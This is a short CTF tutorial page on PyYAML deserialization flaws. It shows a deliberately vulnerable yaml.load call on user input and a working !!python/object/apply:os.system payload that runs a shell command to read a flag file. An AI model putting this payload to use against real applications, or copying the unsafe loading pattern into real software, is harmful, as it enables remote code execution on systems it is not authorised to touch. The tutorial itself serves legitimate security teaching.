---
title: "YAML Deserialization"
description: "Exploit insecure YAML deserialization in Python applications to achieve code execution or access sensitive objects."
date: 2025-10-06
draft: false
weight: 30
categories: ["Web"]
tags: ["yaml", "deserialization", "pYYAML", "python", "web", "ctf"]
authors: ["CTF.Support Team"]
summary: "Learn how unsafe use of yaml.load() leads to arbitrary code execution and how to identify and exploit YAML deserialization bugs in CTF challenges."
aliases: ["/web/python/yaml-deserialization/"]
slug: "yaml-deserialization"
toc: true
---

## Introduction

**YAML deserialization vulnerabilities** occur when a Python application uses `yaml.load()` insecurely on untrusted input.
The `PyYAML` module can instantiate arbitrary Python objects leading to **remote code execution** (RCE).
In web CTFs, YAML files or request payloads often hide this weakness.

---

## Quick Reference

| Task                 | Code / Payload                              |
|----------------------|---------------------------------------------|
| Vulnerable call      | `yaml.load(user_input, Loader=yaml.Loader)` |
| Detect vulnerability | Search for `yaml.load(` in source code      |
| Exploit template     | Use `!!python/object/apply:` payloads       |

---

## Example: Vulnerable Application

```python
import yaml

def parse_config(data):
    return yaml.load(data, Loader=yaml.Loader)

user_yaml = input("Enter YAML: ")
parse_config(user_yaml)
```

---

## Exploitation Example

To trigger code execution, you can invoke OS commands using Python's `os.system` via PyYAML's apply syntax.

```yaml
!!python/object/apply:os.system ["cat flag.txt"]
```

When deserialized, this executes the command on the host.
